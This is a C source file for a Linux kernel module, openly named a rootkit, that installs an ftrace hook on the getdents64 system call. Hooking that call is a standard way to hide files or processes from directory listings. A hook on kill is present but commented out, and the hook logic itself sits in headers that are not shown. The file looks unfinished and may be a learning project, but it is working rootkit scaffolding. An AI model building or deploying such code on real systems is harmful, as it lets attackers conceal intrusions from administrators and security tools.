// TODO go over code, refine it, remove includes, etc...

#include <linux/module.h>
#include <linux/init.h>

#include <linux/kernel.h>
#include <linux/file.h>     // For file operations
#include <linux/mm.h>           // for mm_struct, get_task_mm(), mmput()

//#include <linux/linkage.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

#include "helpers.h" // todo add include protection in header
#include "kill_hook.h"


#include <linux/fs.h>      // for struct file and struct dir_context

#include "getdents_hook.h"
//#include "proc_finder.h"






// define which functions to hook
static struct ftrace_hook hooks[] = {
 //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
        HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    return 0;
}


// Module cleanup: Restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("reached rootkit_exit.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
